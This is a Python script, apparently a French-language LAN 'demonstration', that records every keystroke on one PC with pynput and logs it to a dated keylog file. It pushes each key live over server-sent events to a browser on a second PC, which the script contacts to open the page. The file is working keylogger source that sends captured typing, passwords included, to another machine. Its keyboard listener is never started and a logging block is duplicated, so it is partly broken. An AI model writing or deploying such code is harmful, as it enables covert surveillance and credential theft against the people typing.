import socket
import json
import queue
import threading
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---------------------------------------------------------------------------
# DÉPENDANCES ÉVENTUELLES LIÉES À LA CAPTURE CLAVIER
# ---------------------------------------------------------------------------

from pynput.keyboard import Listener, Key
import logging


# ---------------------------------------------------------------------------
# CONFIGURATION
# ---------------------------------------------------------------------------

HOST = "0.0.0.0"
PORT = 8080


# ---------------------------------------------------------------------------
# CONFIGURATION DU PC B
# ---------------------------------------------------------------------------

# Adresse IP du PC B à renseigner pour le test.
PC_B = "192.168.1.50"

# Port utilisé par le récepteur du PC B.
PORT_B = 9000


# ---------------------------------------------------------------------------
# DÉPENDANCES / BLOC LIÉS À LA CAPTURE CLAVIER
# ---------------------------------------------------------------------------

log_filename = rf"C:\Users\aurelien\Desktop\Aurelien\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"

logging.basicConfig(
    filename=log_filename,
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

logging.info("Démarrage du script")


# ---------------------------------------------------------------------------
# ÉVÈNEMENT GLOBAL D'ARRÊT
# ---------------------------------------------------------------------------

# Cet événement permet au bouton affiché sur le PC B de demander
# l'arrêt propre du serveur HTTP du PC A.
STOP_EVENT = threading.Event()


# ---------------------------------------------------------------------------
# GESTION DES CLIENTS SSE
# ---------------------------------------------------------------------------

_clients = []
_clients_lock = threading.Lock()


def broadcast(texte):
    """Envoie un évènement de démonstration à tous les navigateurs connectés."""
    evenement = {
        "heure": datetime.now().strftime("%H:%M:%S"),
        "texte": texte,
    }

    with _clients_lock:
        for q in list(_clients):
            q.put(evenement)


# ---------------------------------------------------------------------------
# PAGE WEB HÉBERGÉE SUR LE PC A
# ---------------------------------------------------------------------------

PAGE_HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Démonstration réseau - Flux en direct</title>

<style>
  :root { color-scheme: dark; }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    font-family: "Segoe UI", system-ui, sans-serif;
    background: #0d1117;
    color: #e6edf3;
    height: 100vh;
    display: flex;
    flex-direction: column;
  }

  header {
    padding: 16px 24px;
    background: #161b22;
    border-bottom: 1px solid #30363d;
    display: flex;
    align-items: center;
    gap: 12px;
    flex-wrap: wrap;
  }

  header h1 {
    font-size: 18px;
    margin: 0;
  }

  .pill {
    font-size: 12px;
    padding: 4px 10px;
    border-radius: 999px;
    background: #21262d;
    border: 1px solid #30363d;
  }

  .live {
    color: #ff7b72;
  }

  main {
    flex: 1;
    overflow-y: auto;
    padding: 16px 24px;
  }

  #flux {
    white-space: pre-wrap;
    word-break: break-word;
    font-family: "Cascadia Code", Consolas, monospace;
    font-size: 16px;
    line-height: 1.6;
  }

  .actions {
    margin-top: 28px;
  }

  #stopButton {
    border: 1px solid #f85149;
    background: #da3633;
    color: white;
    padding: 10px 16px;
    border-radius: 6px;
    font-size: 14px;
    cursor: pointer;
  }

  #stopButton:disabled {
    opacity: 0.6;
    cursor: default;
  }

  #messageStop {
    display: block;
    margin-top: 12px;
    color: #8b949e;
  }

  footer {
    padding: 8px 24px;
    font-size: 12px;
    color: #6e7681;
    border-top: 1px solid #30363d;
  }
</style>
</head>

<body>

<header>
  <h1>Flux de démonstration — PC A</h1>
  <span class="pill live" id="statut">En attente…</span>
</header>

<main>
  <span id="flux"></span>

  <div class="actions">
    <button id="stopButton" type="button">
      Arrêter la démonstration
    </button>

    <span id="messageStop"></span>
  </div>
</main>

<footer>
  Serveur HTTP du PC A — port 8080
</footer>

<script>
  const flux = document.getElementById("flux");
  const statut = document.getElementById("statut");
  const main = document.querySelector("main");
  const stopButton = document.getElementById("stopButton");
  const messageStop = document.getElementById("messageStop");

  const source = new EventSource("/stream");

  source.onopen = () => {
    statut.textContent = "Connecté — flux actif";
  };

  source.onmessage = (e) => {
    const data = JSON.parse(e.data);

    const ligne = document.createElement("div");
    ligne.textContent = "[" + data.heure + "] " + data.texte;

    flux.appendChild(ligne);
    main.scrollTop = main.scrollHeight;
  };

  source.onerror = () => {
    statut.textContent = "Déconnecté";
  };

  stopButton.addEventListener("click", async () => {
    stopButton.disabled = true;
    messageStop.textContent = "Arrêt du serveur en cours…";

    try {
      const response = await fetch("/stop", {
        method: "POST"
      });

      if (!response.ok) {
        throw new Error("HTTP " + response.status);
      }

      messageStop.textContent = "Serveur arrêté. Vous pouvez fermer cet onglet.";
      statut.textContent = "Arrêté";
      source.close();

    } catch (error) {
      messageStop.textContent = "Impossible d'arrêter le serveur : " + error.message;
      stopButton.disabled = false;
    }
  });
</script>

</body>
</html>
"""


# ---------------------------------------------------------------------------
# SERVEUR HTTP DU PC A
# ---------------------------------------------------------------------------

class Handler(BaseHTTPRequestHandler):

    def log_message(self, *args):
        pass

    def do_GET(self):

        if self.path == "/":

            corps = PAGE_HTML.encode("utf-8")

            self.send_response(200)
            self.send_header(
                "Content-Type",
                "text/html; charset=utf-8"
            )
            self.send_header(
                "Content-Length",
                str(len(corps))
            )
            self.end_headers()

            self.wfile.write(corps)

        elif self.path == "/stream":

            self.send_response(200)
            self.send_header(
                "Content-Type",
                "text/event-stream"
            )
            self.send_header(
                "Cache-Control",
                "no-cache"
            )
            self.send_header(
                "Connection",
                "keep-alive"
            )
            self.end_headers()

            q = queue.Queue()

            with _clients_lock:
                _clients.append(q)

            try:

                while not STOP_EVENT.is_set():

                    try:
                        evenement = q.get(timeout=15)

                        data = json.dumps(
                            evenement,
                            ensure_ascii=False
                        )

                        self.wfile.write(
                            f"data: {data}\n\n".encode("utf-8")
                        )

                    except queue.Empty:
                        self.wfile.write(b": ping\n\n")

                    self.wfile.flush()

            except (BrokenPipeError, ConnectionResetError):
                pass

            finally:

                with _clients_lock:
                    if q in _clients:
                        _clients.remove(q)

        else:
            self.send_error(404)

    def do_POST(self):

        if self.path != "/stop":
            self.send_error(404)
            return

        # Seul le PC B configuré peut demander l'arrêt du serveur.
        ip_client = self.client_address[0]

        if ip_client != PC_B:
            self.send_error(403, "Arrêt non autorisé depuis cette adresse IP")
            return

        print(
            f"[INFO] Demande d'arrêt reçue depuis le PC B : {ip_client}"
        )

        corps = b"OK"

        self.send_response(200)
        self.send_header(
            "Content-Type",
            "text/plain; charset=utf-8"
        )
        self.send_header(
            "Content-Length",
            str(len(corps))
        )
        self.end_headers()
        self.wfile.write(corps)
        self.wfile.flush()

        # Signale au programme principal qu'il doit se terminer.
        STOP_EVENT.set()

        # shutdown() doit être appelé depuis un autre thread que serve_forever().
        threading.Thread(
            target=self.server.shutdown,
            daemon=True
        ).start()


# ---------------------------------------------------------------------------
# DÉMARRAGE DU SERVEUR HTTP
# ---------------------------------------------------------------------------

def demarrer_serveur():

    serveur = ThreadingHTTPServer(
        (HOST, PORT),
        Handler
    )

    print(
        f"[OK] Serveur HTTP lancé sur le port {PORT}"
    )

    try:
        serveur.serve_forever()
    finally:
        serveur.server_close()
        print("[OK] Serveur HTTP arrêté.")


# ---------------------------------------------------------------------------
# RÉCUPÉRATION AUTOMATIQUE DE L'IP DU PC A
# ---------------------------------------------------------------------------

def recuperer_ip_locale():

    s = socket.socket(
        socket.AF_INET,
        socket.SOCK_DGRAM
    )

    try:

        s.connect(
            ("8.8.8.8", 80)
        )

        return s.getsockname()[0]

    except OSError:

        return socket.gethostbyname(
            socket.gethostname()
        )

    finally:
        s.close()


# ---------------------------------------------------------------------------
# CAPTURE CLAVIER
# ---------------------------------------------------------------------------


log_filename = rf"C:\Users\aurelien\Desktop\Aurelien\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"

logging.basicConfig(
    filename=log_filename,
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

logging.info("Démarrage du script")

# ---------------------------------------------------------------------------
# Capture des frappes
# ---------------------------------------------------------------------------

buffer = ""  # Stocke les dernières frappes pour le mot-clé d'arrêt

def on_press(key):
    global buffer
    try:
        # Capture des lettres et chiffres
        touche = key.char
        buffer += touche
        logging.info(touche)
        broadcast(touche)
    except AttributeError:
        try:
            # Gestion des touches spéciales
            if key == Key.space:
                buffer += " "
                logging.info(" [ESPACE] ")
                broadcast(" ")
            elif key == Key.enter:
                buffer += "\n"
                logging.info(" [ENTREE] ")
                broadcast("\n")
            elif key == Key.tab:
                buffer += "\t"
                logging.info(" [TABULATION] ")
                broadcast(" [TABULATION] ")
            elif key == Key.backspace:
                buffer = buffer[:-1]
                logging.info(" [SUPPR] ")
                broadcast(" [SUPPR] ")
            else:
                logging.info(f" [{key}] ")
                broadcast(f" [{key}] ")
        except Exception as e:
            print(f"Erreur lors du traitement de la touche : {e}")



# ---------------------------------------------------------------------------
# DEMANDE D'OUVERTURE DU NAVIGATEUR SUR LE PC B
# ---------------------------------------------------------------------------

def ouvrir_page_sur_pc_b():

    ip_a = recuperer_ip_locale()

    print(
        f"[INFO] Adresse IP du PC A : {ip_a}"
    )

    data = json.dumps({
        "ip": ip_a
    }).encode("utf-8")

    requete = urllib.request.Request(
        f"http://{PC_B}:{PORT_B}/open",
        data=data,
        headers={
            "Content-Type": "application/json"
        },
        method="POST"
    )

    try:

        with urllib.request.urlopen(
            requete,
            timeout=5
        ) as reponse:

            resultat = reponse.read().decode("utf-8")

            print(
                f"[OK] Réponse du PC B : {resultat}"
            )

    except Exception as e:

        print(
            f"[ERREUR] Impossible de contacter le PC B : {e}"
        )


# ---------------------------------------------------------------------------
# DÉMARRAGE
# ---------------------------------------------------------------------------

print("Démarrage du PC A...")

serveur_thread = threading.Thread(
    target=demarrer_serveur,
    daemon=True
)

serveur_thread.start()

print(
    "[INFO] Serveur prêt à recevoir une connexion navigateur."
)

ouvrir_page_sur_pc_b()

print(
    "[OK] Serveur actif."
)

try:
    # Le programme reste actif jusqu'à ce que le bouton du PC B soit utilisé.
    STOP_EVENT.wait()

except KeyboardInterrupt:
    # Ctrl+C reste disponible côté PC A.
    print("\n[INFO] Arrêt manuel demandé sur le PC A.")
    STOP_EVENT.set()

print("[OK] Fin du programme PC A.")
